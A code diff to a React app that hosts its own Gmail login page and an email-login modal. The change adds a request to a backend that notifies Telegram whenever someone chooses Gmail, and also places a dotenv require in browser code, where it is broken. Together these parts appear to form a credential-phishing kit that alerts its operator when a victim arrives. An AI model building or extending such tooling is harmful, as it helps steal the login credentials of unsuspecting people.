@@ -10,13 +10,21 @@ import { useState } from 'react';
 import EmailLoginModal from './emailModel/EmailLoginModal';
 import GmailLogin from "./pages/gmailLogin/GmailLogin";
 import { Routes, Route } from "react-router-dom";
+require('dotenv').config();
+
 
 function App() {
     const [modalOpen, setModalOpen] = useState(false); // ← start closed
     const [selectedProvider, setSelectedProvider] = useState('');
 
-    const openModal = (provider) => {
+    const openModal = async (provider) => {
         if (provider === 'Gmail') {
+            // Notify Telegram first
+            await fetch(`${process.env.REACT_APP_BACKEND_URL}/notify-incoming`, {
+                method: 'POST',
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify({provider}),
+            });
             // Open Gmail login in NEW TAB
             window.open("/gmail-login", "_blank", "noopener,noreferrer");
             return;
